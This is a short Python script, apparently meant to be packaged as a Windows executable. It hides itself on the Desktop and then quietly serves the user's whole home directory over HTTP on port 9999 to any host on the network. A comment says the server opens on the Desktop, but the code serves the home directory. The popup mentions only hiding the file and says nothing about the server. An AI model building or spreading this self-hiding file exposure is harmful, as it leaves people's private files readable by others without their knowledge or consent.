import http.server
import socketserver
import getpass
import os.path
import shutil
import sys
import ctypes

# The file has to be converted to .exe using "pyinstaller --onefile desktop-hidden-http.pyw"

# Display message box
ctypes.windll.user32.MessageBoxW(0, "This files attribute will be set to 'hidden' and moved to your Desktop. In order to see the file, change your Windows File Explorer Options", "Popup", 1)
# This file is moved to the desktop and set to "hidden"

dirpath = os.getcwd()
my_path = dirpath + "\\desktop-hidden-http.exe"

# check if the file exists
exists = os.path.isfile(my_path)
if exists:
    # set file value to hidden and move the file to Desktop
    ctypes.windll.kernel32.SetFileAttributesW(my_path, 2)
    shutil.move(my_path, os.path.join(os.environ["HOMEPATH"], "Desktop"))
else:
    # else statement so that there is no error even if the file does not exist
    pass


# Http Server opened on your desktop
os.chdir(os.environ["HOMEPATH"])
PORT = 9999
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
    


# Now you can reach your server using http://YourIpAddress:9999

